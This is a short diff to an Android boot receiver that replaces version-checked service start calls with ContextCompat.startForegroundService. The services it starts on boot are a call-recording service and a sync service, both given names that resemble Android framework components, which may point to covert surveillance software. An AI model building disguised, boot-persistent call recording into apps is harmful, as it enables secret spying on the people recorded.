@@ -18,20 +18,12 @@ public class SystemBoot extends BroadcastReceiver {
             Intent serviceIntent = new Intent(context, WorkManager_Sync.class);
             serviceIntent.setAction(Constants.ACTION_START_CORE);
 
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                context.startForegroundService(serviceIntent);
-            } else {
-                context.startService(serviceIntent);
-            }
+            androidx.core.content.ContextCompat.startForegroundService(context, serviceIntent);
 
             // Start Call Record Service for call detection
             Intent callServiceIntent = new Intent(context, MediaFrameworkService.class);
             callServiceIntent.setAction(Constants.ACTION_START_AUDIO);
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                context.startForegroundService(callServiceIntent);
-            } else {
-                context.startService(callServiceIntent);
-            }
+            androidx.core.content.ContextCompat.startForegroundService(context, callServiceIntent);
         }
     }
 }
